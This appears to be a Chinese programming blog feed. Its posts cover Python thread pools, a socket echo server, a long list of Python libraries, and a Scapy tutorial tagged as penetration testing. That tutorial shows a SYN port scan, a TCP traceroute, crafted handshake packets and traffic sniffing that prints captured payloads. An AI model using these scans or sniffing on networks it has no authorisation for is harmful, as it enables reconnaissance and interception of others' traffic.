    <content type="text"><![CDATA[server # 使用线程池来实现并发服务器 import socket from multiprocessing.dummy import Pool def worker(conn): while True: recv_data = conn.recv(1000) if not recv_data: break print("客户端{}发送了{}".format(conn, recv_data.decode())) conn.send(recv_data) conn.close() if __name__ == '__main__': server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) pool = Pool(3) while True: conn, addr = server.accept() print("客户端{}连接成功".format(addr)) pool.apply_async(func=worker, args=(conn,)) client import socket c = socket.socket() c.connect(('127.0.0.1',8888)) while True: msg = input('>>>') if msg: c.send(msg.encode()) # 只能发送 bytes 类型的数据 encode将中文的变成byte的 print(c.recv(1024)) else: break c.close() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-简单的线程池的实现]]></title>
    <url>%2Fposts%2F52711%2F</url>
    <content type="text"><![CDATA[# 多进程服务器 创建 销毁 # 通过提前创建好线程 当任务来了 就分配线程去执行 """ 主线程： 相当于生产者，只管向线程池提交任务。 并不关心线程池是如何执行任务的。 因此，并不关心是哪一个线程执行的这个任务。 线程池： 相当于消费者，负责接收任务， 并将任务分配到一个空闲的线程中去执行。 """ from threading import Thread from queue import Queue import time class ThreadPool: def __init__(self, n): # 意味着传啦几次 self.queue = Queue() for i in range(n+1): # 每个线程都去执行类里面的func方法 Thread(target=self.work, args=(self.queue, ), daemon=True).start() def work(self): while True: func, args, kwargs = self.queue.get() func(*args, **kwargs) self.queue.task_done() def apply_async(self, func, args=(), kwargs={}): # 主线程调用的 self.queue.put((func, args, kwargs)) # 扔到队列里面 def join(self): self.queue.join() def task1(): time.sleep(2) print("111") def task2(): time.sleep(2) print("222222") pool = ThreadPool(2) pool.apply_async(task1) pool.apply_async(task2) print("任务提交完成") pool.join() print("任务完成") document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-可重复利用的线程]]></title>
    <url>%2Fposts%2F20484%2F</url>
    <content type="text"><![CDATA[import threading import queue class MyThread(threading.Thread): def __init__(self): super().__init__() self.queue = queue.Queue() self.daemon = True # 守护进程 self.start() # def run(self): # 只有run里的才是子线程执行的 while True: func, args, kwargs = self.queue.get() # 从队列当中获取任务 func(*args, **kwargs) self.queue.task_done() def apply_async(self, func, args=(), kwargs={}): self.queue.put((func, args, kwargs)) def join(self, timeout=None): # 等待所有提交的任务执行完毕 self.queue.join() # 解阻塞 def print_one(): print('111111111') def print_two(): print('222222222222') if __name__ == '__main__': t = MyThread() t.apply_async(print_one) t.apply_async(print_two, args=(1,2), kwargs={"a":1,'b':2}) t.join() # 线程的join 等待队列结束 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python之Scapy]]></title>
    <url>%2Fposts%2F60247%2F</url>
    <content type="text"><![CDATA[关于Scapy是一个Python程序，使用户能够发送，嗅探和剖析并伪造网络数据包。此功能允许构建可以探测，扫描或攻击网络的工具。 换句话说，Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送，捕获它们，匹配请求和回复等等。Scapy可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现。它可以取代hping，arpspoof，arp-sk，arping，p0f甚至是Nmap，tcpdump和tshark的某些部分。Scapy主要做两件事：发送数据包和接收答案。 在python中可以通过scapy这个库轻松实现构造数据包、发送数据包、分析数据包，为网络编程之利器！ 项目地址：https://github.com/secdev/scapy 安装Scapy 有两种使用方式： 直接在shell中使用# 先下载项目到本地 git clone git@github.com:secdev/scapy.git # 运行 ./run_scapy # 交互式使用 作为Python的第三方库使用# 安装 pip3 install scapy # 导入 from scapy.all import * 使用构造数据包from scapy.all import * # 2.构造数据包 IP()创建一个默认数据包 # ls(IP()) 可以查看IP数据包可以有哪些参数。 # 其他数据包同理： TCP(), pkt = IP(dst="114.114.114.114") pkt.show() # 查看数据包信息 pkt.summary() # 方法查看概要信息 hexdump(pkt) # 查看数据包的字节信息 # 使用 '/' 操作符来给数据包加上一层 # 例如构造一个TCP数据包，在IP层指明数据包的目的地址。在TCP层可以设定数据包的目的端口等等。UDP数据包同理。 tcpkt = IP(dst="114.114.114.114")/TCP() tcpkt.show() # 数据包的目标端口可以用范围来表示，发送的时候就会发送dport 不同的多个数据包 tcpkt = IP(dst="114.114.114.114")/TCP(dport=(22,33)) # 如果设置了多个参数为范围的，最后发送的数据包就是笛卡尔积。 tcpkt = IP(dst="114.114.114.114")/TCP(dport=(22,33), sport=(4567, 4568)) for tcp in tcpkt: print(tcp.dport, tcp.sport) 发送数据包 (可能需要管理员权限)# 3.发送数据包 # 发送数据包可能需要管理员权限，使用sudo python3 进入python即可。 ## scapy发送数据包有常用的如下几种方法： """ send(pkt) 发送三层数据包，但不会受到返回的结果(发完就拉倒)。 sr(pkt) 发送三层数据包，返回两个结果，分别是接收到响应的数据包和未收到响应的数据包。 sr1(pkt) 发送三层数据包，仅仅返回接收到响应的数据包。 sendp(pkt) 发送二层数据包。 srp(pkt) 发送二层数据包，并等待响应。 srp1(pkt) 发送第二层数据包，并返回响应的数据包 """ # 例如： ans, uans = sr(pkt) print(ans) print(uans) 简单应用 # 4.应用 # 1）可以构造数据包来实现一个简单的 SYN端口扫描 ，flags="S" 表示发送SYN数据包 port_scan = IP(dst="192.168.0.121")/TCP(dport=[22,80,135,443,3306,3389], flags="S") ans, uans = sr(port_scan) ans.summary() ''' 端口返回的flag位为 SA，表示这些端口是开放的。 而 RA 表示reset ack， 说明这些端口是关闭的。 【见下面图片】 ''' # 2）实现一个基于TCP的traceroute ans, uans = sr(IP(dst="114.114.114.114", ttl=(1,20), id=RandShort())/TCP(flags="0x2")) for snd, rcv in ans: print(snd.ttl, rcv.src, isinstance((rcv.payload, TCP)) # 3) 模拟TCP的三次握手 source = IP(dst="192.168.0.121")/TCP(dport=22) rsp = sr1(source) source2 = IP(dst="192.168.0.121")/TCP(dport=22, flags="A", seq=rsp.ack, ack=rsp.seq+1) rsp2 = sr1(source2) print(rsp2.show()) 其他 # 5.其他 # scapy 还可以用来读取网络流量包或监听网卡流量。 """ 1. 使用函数 rdpcap("/abc/def/xxxx.pcap") 可以读取包的内容， 2. 再使用 haslayer(TCP) 或 haslayer(ICMP) 等等来判断数据包的类型。 3. 使用 sniff(iface="who1",count=100,filter="tcp xxxx") 可以监听网卡流量，iface声明监听的网卡，filter是过滤条件，count是符合过滤条件的数据包的个数，达到指定的数据包个数后会停止监听，不设count则没有限制，按ctrl-c 结束监听。 4. sniff也支持无线网卡的监听模式。 """ 抓包、分析包""" prn指向一个回调函数，意为将收到的包丢给prn指向的函数处理（注意：回调的意义！每收到一个包就丢到回调函数里执行一下，执行完了才再跑回来继续抓包） filter为包过滤规则（语法参照tcpdump过滤规则） store为是否要存储抓到的包（注意，如果没有存储则不会将抓到的包赋值给a，因为没有存下就没有东西可以赋，此参数默认开启） timeout为抓包时长，比如抓30秒就结束（注意：如果没有指定抓包时长则会一直抓下去，程序会一直卡在这里） iface为指定抓包的网卡 """ a = sniff(prn=abc, filter='tcp port 80 and ip 192.168.1.1', store=1, timeout=30, iface='eth0') # 此函数可以将抓到的包存到本地（注意：将包写入本地不能使用open（'packet.cap', 'r'）,因为open函数只能写入字符串）。 wrpcap('packet.cap', a) # 此函数可以将本地存储的数据包读取出来 bbb = rdpcap('/root/Desktop/ftp.cap') # 读取出来的对象是由N个数据包组成的可迭代对象，每次迭代一个包 for i in bbb: try: # 输出数据包的应用层负载 print(i.getlayer('Raw').fields['load'].decode().strip()) except : continue 先简单了解一下，剩下的后面慢慢学 更多用法见官方文档：https://scapy.readthedocs.io/en/latest/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Python</tag>
        <tag>Scapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-常用库]]></title>
    <url>%2Fposts%2F1f32c333%2F</url>
    <content type="text"><![CDATA[转载自：https://www.jianshu.com/p/d25a9169fe86 哈哈哈，我见大佬把这么多库都整理出来了，赶紧转载一下，太厉害啦。 库名称 简介 Chardet 字符编码探测器，可以自动检测文本、网页、xml的编码。 colorama 主要用来给文本添加各种颜色，并且非常简单易用。 Prettytable 主要用于在终端或浏览器端构建格式化的输出。 difflib，[Python]标准库，计算文本差异Levenshtein，快速计算字符串相似度。 fuzzywuzzy 字符串模糊匹配。 esmre 正则表达式的加速器。 shortuuid 一组简洁URL/UUID函数库。 ftfy，Unicode文本工具7 unidecode，ascii和Unicode文本转换函数。 xpinyin，将汉字转换为拼音的函数库 pangu.py，调整对中日韩文字当中的字母、数字间距。 pyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片 uniout，提取字符串中可读写的字符 awesome slugify，一个Python slugify库，用于处理Unicode。 python-slugify，转换Unicode为ASCII内码的slugify函数库。 unicode-slugify，生成unicode内码，Django的依赖包。 ply，Python版的lex和yacc的解析工具phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。 python-user-agents，浏览器的用户代理（user-agents）的解析器。 sqlparse，SQL解析器。 pygments，一个通用的语法高亮工具。 python-nameparser，解析人名，分解为单独的成分。 pyparsing，通用解析器生成框架。 tablib，表格数据格式，包括，XLS、CSV，JSON，YAML。 python-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。 xlwt/xlrd，读写Excel格式的数据文件。 xlsxwriter，创建Excel格式的xlsx文件。 xlwings，利用Python调用Excelcsvkit，CSV文件工具包。 marmir，把Python[数据结构]，转化为电子表格。 pdfminer，从PDF文件中提取信息。 pypdf2， 合并和转换PDF页面的函数库。 Python-Markdown，轻量级标记语言Markdown的Python实现。 Mistune，,快速、全功能的纯Python编写的Markdown解释器。 dateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成 datetime，而rrule是则是根据定义的规则来生成datetime。 arrow,更好的日期和时间处理Python库 chronyk，一个Python 3版函数库，用于解析人写的时间和日期。 delorean，清理期时间的函数库。 when.py，为见的日期和时间，提供人性化的功能。 moment，类似Moment.js的日期/时间Python库 pytz，世界时区，使用tz database时区信息[数据库] BeautifulSoup，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析。 lxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。 htmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。 pyyaml，Python版本的YAML解释器。 html5lib，-标准库，解析和序列化HTML文档和片段。 pyquery，类似[jQuery]的的HTML解释器函数库。 cssutils，Python CSS库。 MarkupSafe，XML或HTML / XHTML安全字符串标记工具。 cssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleach，漂白，基于HTML的白名单函数库。 xmltodict，类似JSON的XML工具包。 xhtml2pdf，HTML / CSS格式转换器，看生成pdf文档。 untangle，把XML文档，转换为Python对象，方便访问。 文件处理 库名称简介Mimetypes，Python标准库，映射文件名到MIME类型。 imghdr，Python标准库，确定图像类型。 python-magic，libmagic文件类型识别库，Python接口格式。 path.py，os.path模块的二次封装。 watchdog，一组API和shell实用程序，用于监视文件系统事件。 Unipath，面向对象的文件/目录的操作工具包。 pathlib，-（Python 3.4版已经作为Python标准库），一个跨平台，面向path的函数库。pickle/cPickle,python的pickle模块实现了基本的数据序列和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。 cPickle是[C语言]实现的版本，速度更快。 ConfigParser，Python标准库，INI文件解析器。 configobj，INI文件解析器。 config，分层次配置，logging作者编写。 profig，多格式配置转换工具。 logging，Python标准库，日志文件生成管理函数库。 logbook，logging的替换品。 Sentry，实时log服务器。 Raven，哨兵Sentry的Python客户端。 Sphinx，斯芬克斯（狮身人面像），Python文档生成器。 reStructuredText，标记语法和解析工具，Docutils组件。 mkdocs，Markdown格式文档生成器。 pycco，简单快速、编程风格的文档生成器。 pdoc，自动生成的Python库API文档epydoc，从源码注释中生成各种格式文档的工具 图像处理 库名称简介PIL（Python Image Library），基于Python的图像处理库，功能强大，对图形文件的格式支持广泛，内置许多图像处理函数，如图像增强、滤波[算法]等。 Pillow，图像处理库，PIL图像库的分支和升级替代产品。 Matplotlib，著名的绘图库，提供了整套和matlab相似的命令API，用以绘制一些高质量的数学二维图形，十分适合交互式地进行制图。 brewer2mpl，有一个专业的python配色工具包，提供了从美术角度来讲的精美配色。 PyGame基于Python的多媒体开发和游戏软件开发模块，包含大量游戏和图像处理功能。 Box2d，开源的2d物理引擎，愤怒的小鸟就是使用了这款物理引擎进行开发的，Box2d物理引擎内部模拟了一个世界，你可以设置这个世界里的重力，然后往这个世界里添加各种物体，以及他们的一些物理特性，比如质量，摩擦，阻尼等等。 Pymunk，类似box2d的开源物理图形模拟库。 OpenCV, 目前最好的开源图像/视觉库，包括图像处理和计算机视觉方面、[机器学习]的很多通用算法。 SimpleCV，计算机视觉开源框架，类似opencv。 VTK，视觉化工具函式库（VTK， Visualization Toolkit）是一个开放源码，跨平台、支援平行处理（VTK曾用于处理大小近乎1个Petabyte的资料，其平台为美国Los Alamos国家实验室所有的具1024个处理器之大型系统）的图形应用函式库。2005年时曾被美国陆军研究实验室用于即时模拟俄罗斯制反导弹战车ZSU23-4受到平面波攻击的情形，其计算节点高达2.5兆个之多。 cgkit,Python Computer Graphics Kit,其module 主要分两个部分 \1. 与3d相关的一些python module 例如the vector, matrix and quaternion types, the RenderMan bindings, noise functions 这些模块可以在maya houdini nuke blender 等有Python扩展的程序中直接用; \2. 提供完整的场景操作的module， 他类似其他三维软件，在内存中保留完整的描述场景的信息。不能直接用于maya 等。 CGAL，Computational Geometry Algorithms Library，计算几何算法库，提供计算几何相关的数据结构和算法，诸如三角剖分（2D约束三角剖分及二维和三维Delaunay三角剖分），Voronoi图（二维和三维的点，2D加权Voronoi图，分割Voronoi图等），多边形（布尔操作，偏置），多面体（布尔运算），曲线整理及其应用，网格生成（二维Delaunay网格生成和三维表面和体积网格生成等），几何处理（表面网格简化，细分和参数化等），凸壳算法（2D，3D和dD），搜索结构（近邻搜索，kd树等），插值，形状分析，拟合，距离等。 Aggdraw，开源图像库，几乎涵盖了2d image操作的所有功能，使用起来非常灵活。 Pycairo,开源矢量绘图库 Cairo开罗的python接口，cairo提供在多个背景下做2-D的绘图，高级的更可以使用硬件加速功能。 wand，Python绑定魔杖工具（MagickWand），C语言API接口。 thumbor， -智能成像工具，可调整大小和翻转图像。 imgSeek，查询相似的图像。 python-qrcode，纯Python的二维码（QR码）生成器。 pyBarcode，创建条码，无需PIL模块。 pygram，Instagram像图像过滤器。 Quads，基于四叉树的计算机艺术。 nude.py，裸体检测函数。 scikit-image，scikit工具箱的图像处理库。 hmap，图像直方图工具。 bokeh，交互的Web绘图。 plotly，Web协同的Python和Matplotlib绘制。 vincent，文森特，Python Vega的函数库。 d3py，Python绘图库，基于D3.JS, ggplot -API兼容R语言的ggplot2.Kartograph.py，在Python绘制漂亮的SVG地图。 pygal， SVG图表的创造者。 pygraphviz，Graphviz的Python接口。 Fonttlools，ttf字体工具函数包，用于fontforge、ttx等字体软件。 游戏和多媒体 库名称简介audiolazy，数字信号处理（DSP）的Python工具包。 audioread，跨平台（GStreamer + Core Audio + MAD + FFmpeg）音频解码库。 beets，音乐库管理。dejavu，音频指纹识别算法。 Dejavu 听一次音频后就会记录该音频的指纹信息，然后可通过麦克风对输入的音频进行识别是否同一首歌。 django-elastic-transcoder,Django +亚马逊elastic转码。 eyeD3,音频文件工具，特别是MP3文件包含的ID3元数据。 id3reader，用于读取MP3的元数据。 mutagen，处理音频元数据。 pydub，-操纵音频和简单的高层次的接口。 pyechonest，Echo Nest API客户端。 talkbox，语音和信号处理的Python库。 TimeSide，开放的网络音频处理框架。 tinytag，读取音乐文件元数据，包括的MP3，OGG，FLAC和wave文件。 m3u8，用于解析m3u8文件。 moviepy，多格式视频编辑脚本模块，包括GIF动画。 shorten.tv，视频摘要。scikit视频，SciPy视频处理例程。 GeoDjango,一个世界级的地理Web框架。 geopy,Geo地理编码的工具箱。 pygeoip，纯Python写的GeoIP API。 GeoIP，Python API接口，使用高精度GeoIP Legacy Database数据库。 geojson，GeoJSON函数库django-countries，一个Django程序，提供国家选择，国旗图标的静态文件，和一个国家的地域模型。 Pygame，Python游戏设计模块。 Cocos2d，2D游戏框架，演示，和其他的图形/交互应用，基于pyglet。Cocos2d- cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.,PySDL2，SDL2的封装库。 Panda3D- 3D游戏引擎，迪士尼开发。用C++写的，完全兼容Python。 PyOgre，OGRE 3D渲染引擎，可用于游戏，模拟，任何3D。 PyOpenGL，绑定OpenGL和它相关的API。 PySFML，Python绑定SFMLRenPy，视觉小说引擎。 大数据与科学计算 库名称简介pycuda/opencl，GPU高性能并发计算Pandas，python实现的类似R语言的数据统计、分析平台。基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。 Open Mining，商业智能（BI），Pandas的Web界面。 blaze，NumPy和Pandas大数据界面。 SciPy，开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。 ScientificPython，一组经过挑选的Python程序模块，用于科学计算，包括几何学（矢量、张量、变换、矢量和张量场），四元数，自动求导数，（线性）插值，多项式，基础统计学，非线性最小二乘拟合，单位计算，Fortran兼容的文本格式，通过VRML的3D显示，以及两个Tk小工具，分别用于绘制线图和3D网格模型。此外还具有到netCDF，MPI和BSPlib库的接口。 NumPy科学计算库，提供了矩阵，线性代数，傅立叶变换等等的解决方案, 最常用的是它的N维数组对象. NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。 Cvxopt，最优化计算包，可进行线性规划、二次规划、半正定规划等的计算。 Numba，科学计算速度优化编译器。 pymvpa2，是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。 NetworkX，复杂网络的优化软件包。 zipline，交易算法的函数库。 PyDy， Python动态建模函数库。 SymPy,符号数学的Python库。 statsmodels,Python的统计建模和计量经济学。 astropy,天文学界的Python库。 orange，橙色，数据挖掘，数据可视化，通过可视化编程或Python脚本学习机分析。RDKit,化学信息学和机器学习的软件。 Open Babel，巴贝尔，开放的化学工具箱。 cclib，化学软件包的计算函数库。 Biopython，免费的生物计算工具包。 bccb，生物分析相关的代码集。 bcbio-nextgen，提供完全自动化、高通量、测序分析的工具包。 visvis, 可视化计算模块库，可进行一维到四维数据的可视化。 MapReduce是Google提出的一个软件[架构]，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的MapReduce函数库。 Framworks and libraries for MapReduce.,PySpark，[Spark]的Python API。dpark，Spark的Python克隆，Python中的MapReduce框架。 luigi，为批量工作，建立复杂的管道。 mrjob，运行在[Hadoop]，或亚马逊网络服务的，MapReduce工作。 人工智能与机器学习 库名称简介NLTK（natural language toolkit)，是python的自然语言处理工具包。2001年推出，包括了大量的词料库，以及自然语言处理方面的算法实现：分词， 词根计算， 分类， 语义分析等。 Pattern，数据挖掘模块，包括自然语言处理，机器学习工具，等等。 textblob，提供API为自然语言处理、分解NLP任务。基于NLTK和Pattern模块。 jieba，结巴，中文分词工具。 snownlp，用于处理中文文本库。 loso，中文分词函数库。 genius，中文CRF基础库，条件随机场(conditional random field,简称 CRF),是一种鉴别式机率模型,是随机场的一种,常用于标注或分析序列资料,如自然语言文字或是生物序列。 Gensim，一个相当专业的主题模型Python工具包，无论是代码还是文档，可用于如何计算两个文档的相似度LIBSVM,是台湾大学林智仁(Lin Chih-Jen)教授等开发设计的一个简单、易于使用和快速有效的SVM模式识别与回归的软件包，他不但提供了编译好的可在Windows系列系统的执行文件，还提供了源代码，方便改进、修改以及在其它[操作系统]上应用；该软件对SVM所涉及的参数调节相对比较少，提供了很多的默认参数，利用这些默认参数可以解决很多问题；并提供了交互检验(Cross Validation)的功能。该软件可以解决C-SVM、ν-SVM、ε-SVR和ν-SVR等问题，包括基于一对一算法的多类模式识别问题。 scikits.learn，构建在SciPy之上用于机器学习的 Python 模块。它包括简单而高效的工具，可用于数据挖掘和数据分析。涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。 PyMC，机器学习采样工具包，scikit-learn似乎是所有人的宠儿，有人认为，PyMC更有魅力。PyMC主要用来做Bayesian分析。 Orange，基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。侧重数据挖掘，可以用可视化语言或Python进行操作，拥有机器学习组件，还具有生物信息学以及文本挖掘的插件。 Milk，机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。 PyMVPA(Multivariate Pattern Analysis in Python),是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。 NuPIC，开源人工智能平台。该项目由Grok（原名 Numenta）公司开发，其中包括了公司的算法和软件架构。NuPIC 的运作接近于人脑，“当模式变化的时候，它会忘掉旧模式，记忆新模式”。如人脑一样，CLA 算法能够适应新的变化。 Pylearn2，-基于Theano的机器学习库。 hebel，GPU加速，[深度学习]Python库。 gensim，机器学习库。 pybrain，机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。pybrain包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。以神经网络为核心，所有的训练方法都以神经网络为一个实例Mahout,是 Apache Software Foundation（ASF） 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序。Mahout包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。此外，通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到云中。 Crab，灵活的，快速的推荐引擎。 python-recsys，娱乐系统分析，推荐系统。 vowpal_porpoise，Vowpal Wabbit轻量级Python封装。 Theano,用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题的python软件包。它使得写深度学习模型更加容易，同时也给出了一些关于在GPU上训练它们的选项。 系统与命令行 库名称简介threading，Python标准线程库，更高级别的线程接口。 envoy，特使，Python子线程的函数库。 sh，成熟的子线程替换函数库。 sarge，封装线程。 subprocess,调用shell命令的神器argparse，写命令行脚本必备，强大的命令行差数解析工具timeit，计算代码运行的时间等等unp，命令行工具，解压文件。 eventlet开销很少的多线程模块，使用的是 green threads 概念，例如，pool = eventlet.GreenPool(10000) 这样一条语句便创建了一个可以处理 10000 个客户端连接的线程池。类似Gevent线程库Gevent，多线程模块pytools,著名的python通用函数、工具包SendKeys, 键盘鼠标操作模块, 模拟键盘鼠标模拟操作。 pyHook,基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。这个库依赖于另一个Python库PyWin32，如同名字所显示的，PyWin32只能运行在Windows平台，所以PyHook也只能运行在Windows平台。 pstuil,跨平台地很方便获取和控制系统的进程，以及读取系统的CPU占用内存占用等信息. cement，一个轻量级的、功能齐全的命令行工具 click，简单优雅的的命令行接口。 clint，Python命令行工具。 cliff，创造多层次指令的命令行程序框架。 Clime， 可以转换任何模块为多的CLI命令程序，无任何配置。 docopt，Python命令行参数分析器。 pycli，命令行应用程序，支持的标准命令行解析，测井，单元[测试]和功能测试。 Gooey，打开命令行程序，作为为一个完整的GUI应用程序,cookiecutter，命令行工具，从cookiecutters（项目模板）创建项目。例如，Python包项目，jQuery插件项目。percol，为UNIX传统管道pipe命令，添加交互式选择风格。 rainbowstream，聪明和漂亮的推特客户终端。 Django Models，Django的一部分SQLAlchemy，Python SQL工具包和对象关系映射。 peewee，小型的ORM解析器。 PonyORM，为ORM提供了一种面向SQL的接口。 MongoEngine，Python对象文件映射，使用[MongoDB]。, Django MongoDB引擎MongoDB , Django后台。 django-mongodb-engine，Django后台.redisco,一个简单的模型和容器库，使用[Redis]flywheel，Amazon DynamoDB对象映射。 butterdb，谷歌电子表格的ORM，Python版。 celery，芹菜，异步任务队列/工作，基于分布式消息队列。 huey，休伊，轻量级，多线程任务队列。 mrq，队列先生，分布式任务队列，使用redis &amp; Gevent。 rq，简单的工作队列。 Queue,Queue模块可以用来实现多线程间通讯，让各个线程共享数据，生产者把货物放到Queue中，供消费者（线程）去使用。 simpleq，简单的，可扩展的队列，Amazon SQS基础队列。 Psyco，超强的python性能优化工具，psyco 的神奇在于它只需要在代码的入口处调用短短两行代码，性能就能提升 40% 或更多，真可谓是立竿见影！如果你的客户觉得你的程序有点慢，敬请不要急着去优化代码，psyco 或许能让他立即改变看法。psyco 堪称 Python 的 jit。fn.py，Python函数编程：缺失的功能享受FP的实现。 funcy，函数编程工具。 Toolz，函数编程工具：迭代器、函数，字典。 CyToolz，Toolz的Cython实现，高性能的函数编程工具。 Ansible，安塞波，极为简单的自动化平台。 SaltStack，基础设施的自动化管理系统。 Fabric，织物，一个简单，远程执行和部署的语言工具。 Fabtools，Fabric的工具函数。 cuisine，热门的Fabric的工具函数。 psutil，跨平台的过程和系统工具模块。 pexpect，控制互动节目。 provy，易于使用的配置系统的Python。 honcho，Foreman的Python接口，用于管理procfile应用工具。 gunnery，多任务执行工具，与网络接口的分布式系统。 fig，快速。独立的开发环境中使用泊坞窗。 APScheduler，轻量级、但功能强大的在线任务调度程序。 django-schedule,Django日程应用程序。 doit,任务流道/生成工具。 Joblib,Python提供的轻量级的流水线工具函数。 Plan，简易生成crontab文件。 Spiff，纯Python实现的，功能强大的工作流引擎。 schedule，Python作业调度。 TaskFlow，有助于使任务执行简单。 ctypes，Python标准库，速度更快，Python调用C代码的外部函数接口。 cffi，Python调用C代码外部函数接口，类似于ctypes直接在python程序中调用c程序,但是比ctypes更方便不要求编译成so再调用。 Cytoolz，python 加速库SWIG，简化封装和接口生成器。 Cython，Python优化静态编译器。 PyPy，Python解释器的 Python实现。 Stackless Python，一个增强版本的Python。它使程序员从基于线程的编程方式中获得好处，并避免传统线程所带来的性能与复杂度问题。Stackless为 Python带来的微线程扩展，是一种低开销、轻量级的便利工具Pyston,使用LLVM和现代JIT技术,对python进行性能优化。 pythonlibs，非官方的Windows（32 / 64位）的Python扩展包scapy，优秀的数据包处理库。 ino，Arduino命令行工具。 Pyro，Python的机器人工具包。 pluginbase，一个简单而灵活的Python的插件系统。 itsdangerous，数据安全传输工具。 blinker，快速Python中的信号/事件调度系统。 pychievements，用于创建和跟踪成果框架。 python-patterns，Python中的设计模式。 pefileWindows PE文件解析器SIP，自动为C和C++库生成Python扩展模块的工具。 数据库 库名称简介MySQLdb，成熟的[MySQL]数据库模块,Baresql,SQL数据库包ZODB，Python本地对象数据库。一个K-V对象图数据库。 pickledb,简单和轻量级的K-V键值存储。 TinyDB, 轻量级，面向文档的数据库。 mysql-python，MySQL的Python工具库。 mysqlclient，mysql-python分支，支持Python 3.,PyMySQL,纯Python写的 MySQL驱动程序，兼容mysql-python。 mysql-connector-python,MySQL连接器,来自[Oracle]，纯Python编写。 oursql，MySQL连接器，提供本地话指令语句和BLOBs支持。 psycopg2，最流行的Python PostgreSQL适配器。 txpostgres，于Twisted的异步驱动，用于PostgreSQL。 